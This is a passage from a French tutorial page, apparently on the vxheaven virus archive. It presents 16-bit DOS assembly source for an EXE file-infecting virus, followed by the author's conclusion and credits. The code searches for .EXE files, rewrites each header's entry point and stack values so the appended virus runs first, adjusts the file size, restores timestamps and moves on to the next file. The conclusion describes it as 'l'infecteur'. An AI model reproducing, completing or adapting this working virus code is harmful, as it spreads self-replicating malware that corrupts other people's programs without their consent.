<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">42h</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00h</span><br/>
<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span><br/>
<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">21h</span><br/>
<br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1ah</span><br/>
<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span> <span style="color: #339933;">+</span> buffer_header<span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">21h</span><br/>
<br/>
<span style="color: #00007f; font-weight: bold;">jmp</span> close2<br/>
<br/>
close<span style="color: #339933;">:</span><br/>
<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">bx</span><br/>
<br/>
close2<span style="color: #339933;">:</span><br/>
<br/>
<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">cx</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">5701h</span><br/>
<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">21h</span><br/>
<br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3eh</span><br/>
<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">21h</span><br/>
<br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4fh</span><br/>
<span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp;search<br/>
<br/>
end<span style="color: #339933;">:</span><br/>
<span style="color: #00007f; font-weight: bold;">pop</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">ds</span><br/>
<br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span>1a<br/>
<span style="color: #00007f; font-weight: bold;">int</span> &nbsp;<span style="color: #ff0000;">21</span><br/>
<br/>
<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ds</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
<span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span><br/>
<span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
<span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>cs_new<span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
<span style="color: #00007f; font-weight: bold;">cli</span><br/>
<span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>ss_new<span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ss</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>sp_new<span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">sti</span><br/>
<br/>
<span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;0ea &nbsp; &nbsp;<br/>
ip_new &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
cs_new &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
sp_new &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
ss_new &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
<br/>
<br/>
ip_old &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
cs_old &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> &nbsp; &nbsp; &nbsp;0fff0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
sp_old &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
ss_old &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> &nbsp; &nbsp; &nbsp;0fff0 &nbsp; &nbsp; &nbsp; &nbsp; <br/>
<br/>
<br/>
<br/>
save_header<span style="color: #339933;">:</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">0Eh</span><span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>ss_old<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">10</span><span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>sp_old<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">14</span><span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>ip_old<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">16</span><span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>cs_old<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
<span style="color: #00007f; font-weight: bold;">ret</span><br/>
<br/>
<br/>
new_csip<span style="color: #339933;">:</span><br/>
<br/>
<br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span> <br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0004h</span><br/>
<span style="color: #00007f; font-weight: bold;">shl</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cl</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
<span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">bx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
<span style="color: #00007f; font-weight: bold;">sbb</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0000h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0010h</span><br/>
<span style="color: #00007f; font-weight: bold;">div</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">0Eh</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span> <br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">14h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">12h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'T'</span> <br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">16h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span> <br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>0FFFE<br/>
<span style="color: #00007f; font-weight: bold;">ret</span><br/>
&nbsp; &nbsp; &nbsp;<br/>
<br/>
<br/>
new_size<span style="color: #339933;">:</span><br/>
<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> fin <span style="color: #339933;">-</span> debut<br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">200h</span><br/>
<span style="color: #00007f; font-weight: bold;">div</span> <span style="color: #46aa03; font-weight: bold;">bx</span><br/>
<span style="color: #00007f; font-weight: bold;">add</span> &nbsp;<span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">04</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
<span style="color: #00007f; font-weight: bold;">add</span> &nbsp;<span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">02</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">02</span><span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">200h</span><br/>
<span style="color: #00007f; font-weight: bold;">jb</span> ttvabien<br/>
<span style="color: #00007f; font-weight: bold;">and</span> &nbsp;<span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">02</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1FFh</span><br/>
<span style="color: #00007f; font-weight: bold;">inc</span> &nbsp;<span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">04</span><span style="color: black;">&#93;</span><br/>
<br/>
ttvabien<span style="color: #339933;">:</span><br/>
<span style="color: #00007f; font-weight: bold;">ret</span><br/>
<br/>
<br/>
<br/>
exe_mask &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; <span style="color: #7f007f;">'*.EXE'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
fin<span style="color: #339933;">:</span><br/>
<br/>
buffer_header &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;1a dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
new_dta<span style="color: #339933;">:</span><br/>
<br/>
end debut<br/>
&nbsp;</div>
<h2><a name="c4"></a>4. Conclusion</h2>
<p>Tout d'abord, pour ce qui est de l'infecteur, testez le dans un répertoire isolé, et aussi testez le sur des fichiers 16 bits (et pas avec des fichiers win32). J'essairai surement plus tard de faire un article sur les infecteurs de fichiers win32, si ça vous intéresse, faites moi le savoir. Nous avons fini avec cette article, j'espère que je n'ai pas fait d'erreurs. Si c'est le cas, n'hésitez pas à me le dire. Pour toutes questions, remarques et critiques écrivez moi à: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cbb9a2a0aea5aab9e5aaa78ba8aab9aaa6aaa2a7e5a8a4a6e5">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
<p>Je souhaite remercier tous ceux qui ont pu m'aider pour l'élaboration de ce code, c'est à dire en priorité kaze et EmperOr qui m'ont été d'un aide précieuse mais aussi Harl0ck. Et je remercie aussi tous ceux du zine Ioc pour le zine qu'il faisait et tous les autres que je connais pas mais qui essaie de faire bouger les choses. Excusez moi pour les fautes.</p>
<p>a+</p>
<p>Documents utilisés:</p>
<ul>
<li>Article de Lion7 dans ioc sur les exe infector.</li>
<li>Le guide de Billy Belcebù qui a été traduit par Androgyne.</li>
</ul>
<p>barbus.homeunix.org/rikenar</p>
[<a style="" href="/lib/?lang=FR&amp;index=DO#vri00">Back to index</a>] [<a href="/lib/vri00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vri00">de</a><a href="/lib/index.php?lang=en&amp;id=vri00">en</a><a href="/lib/index.php?lang=es&amp;id=vri00">es</a><a href="/lib/index.php?lang=it&amp;id=vri00">it</a><a href="/lib/index.php?lang=fr&amp;id=vri00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vri00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vri00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vri00">ua</a></div>
</body>
</html>
